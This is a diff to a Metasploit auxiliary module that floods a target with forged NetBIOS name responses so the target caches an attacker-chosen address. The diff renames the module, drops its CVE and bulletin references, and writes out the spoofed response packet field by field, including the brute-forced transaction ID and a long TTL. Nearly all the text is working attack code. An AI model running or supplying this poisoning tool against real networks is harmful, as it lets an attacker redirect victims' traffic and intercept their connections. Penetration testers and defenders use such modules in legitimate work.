@@ -11,7 +11,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'NetBIOS "BadTunnel" Name Poisoner (Direct)',
+      'Name'        => 'NetBIOS Response Brute Force Spoof (Direct)',
       'Description'    => %q{
           This module continuously spams NetBIOS responses to a target for given hostname,
         causing the target to cache a malicious address for this name. On high-speed local
@@ -21,19 +21,11 @@ class MetasploitModule < Msf::Auxiliary
         rates for a successful attack.
       },
       'Authors'     => [
+        'vvalien',   # Metasploit Module (post)
         'hdm',       # Metasploit Module
-        'tombkeeper' # Vulnerability Discovery
+        'tombkeeper' # Related Work
       ],
       'License'     => MSF_LICENSE,
-      'References'  =>
-        [
-          ['URL', 'http://xlab.tencent.com/en/2016/06/17/BadTunnel-A-New-Hope/'],
-          ['CVE', '2016-3213'],
-          ['MSB', 'MS16-063'],
-          ['CVE', '2016-3236'],
-          ['MSB', 'MS16-077']
-        ],
-      'DisclosureDate' => 'Jun 14 2016'
     )
 
     register_options(
@@ -49,17 +41,27 @@ class MetasploitModule < Msf::Auxiliary
 
   def netbios_spam
     payload =
-      "\xff\xff" + # TXID
-      "\x85\x00\x00\x00\x00\x01\x00\x00\x00\x00\x20" +
-      Rex::Proto::SMB::Utils.nbname_encode( [@fake_name.upcase].pack("A15") + "\x00" ) +
-      "\x00\x00\x20\x00\x01\x00\xff\xff\xff\x00\x06\x00\x00" +
-      Rex::Socket.addr_aton(@fake_addr)
+        "\xff\xff"   + # TX ID (will brute force this)
+        "\x85\x00"   + # Flags = response + authoratative + recursion desired
+        "\x00\x00"   + # Questions = 0
+        "\x00\x01"   + # Answer RRs = 1
+        "\x00\x00"   + # Authority RRs = 0
+        "\x00\x00"   + # Additional RRs = 0
+        "\x20"       +
+        Rex::Proto::SMB::Utils.nbname_encode( [@fake_name.upcase].pack("A15") + "\x00" ) +
+        "\x00"       +
+        "\x00\x20"   + # Type = NB 
+        "\x00\x01"   + # Class = IN
+        "\x00\x04\x93\xe0" + # TTL long time
+        "\x00\x06"   + # Datalength = 6
+        "\x00\x00"   + # Flags B-node, unique
+        Rex::Socket.addr_aton(@fake_addr)
 
     stime = Time.now.to_f
     pcnt = 0
     pps  = 0
 
-    print_status("BadTunnel:  >> Spamming NetBIOS responses for #{@fake_name}/#{@fake_addr} to #{@targ_addr}:#{@targ_port} at #{@targ_rate}/pps...")
+    print_status("Spamming NetBIOS responses for #{@fake_name}/#{@fake_addr} to #{@targ_addr}:#{@targ_port} at #{@targ_rate}/pps...")
 
     live = true
     while live
@@ -74,14 +76,14 @@ class MetasploitModule < Msf::Auxiliary
             sleep(0.01)
           end
         rescue Errno::ECONNREFUSED
-          print_error("BadTunnel:  >> Error: Target sent us an ICMP port unreachable, port is likely closed")
+          print_error("Error: Target sent us an ICMP port unreachable, port is likely closed")
           live = false
           break
         end
       end
     end
 
-    print_status("BadTunnel:  >> Cleaning up...")
+    print_status("Cleaning up...")
   end
 
   def run
